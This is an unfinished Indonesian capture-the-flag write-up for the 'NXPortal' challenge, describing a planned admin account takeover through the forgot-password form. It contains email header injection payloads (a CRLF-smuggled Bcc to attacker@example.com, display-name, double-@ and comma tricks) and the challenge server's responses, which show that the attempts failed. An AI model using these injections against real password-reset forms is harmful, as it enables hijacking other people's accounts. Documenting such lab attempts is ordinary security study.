# NXPortal — Eksploitasi / Solver (sebagian, belum selesai)

[← Overview](13-nxportal.md) · [Index](index.md)

### 3.1 Strategi yang dituju

1. Bypass filter domain dengan display-name/double-`@`/CRLF.
2. Gunakan header injection (`Bcc:`/`Cc:`/`To:`) atau envelope injection agar
   email recovery terkirim ke inbox eksternal yang dikendalikan penyerang.
3. Dari email, ambil link `/reset?token=...` atau token di body.
4. `POST /reset` untuk mengganti password admin (`admin@nxctf.local`).
5. Login sebagai admin dan baca flag di `/dashboard` (atau console admin).

### 3.2 Payload yang sudah disiapkan

```http
POST /forgot HTTP/1.1
Host: s1.nfx.my.id:40001
Content-Type: application/x-www-form-urlencoded

email=admin%40nxctf.local%0d%0aBcc%3A%20attacker%40example.com
```

atau:

```text
email="nxctf.local" <attacker@example.com>
email=attacker@nxctf.local@example.com
email=attacker@example.com, admin@nxctf.local
```

### 3.3 Output yang diperoleh

Semua payload di atas diterima dengan pesan sukses, tetapi tidak ada email yang
sampai ke inbox eksternal. Tidak ada token yang bisa dipakai di `/reset`.

```text
A_display    HTTP 200 -> success
B_doubleat   HTTP 200 -> success
D_crlf       HTTP 200 -> success
E_newline    HTTP 200 -> success
F_comma      HTTP 200 -> success

mail.tm HTTP 200
messages 0
```

`/reset`:

```text
token=x         -> Invalid or expired reset token.
token=test      -> Invalid or expired reset token.
...
```
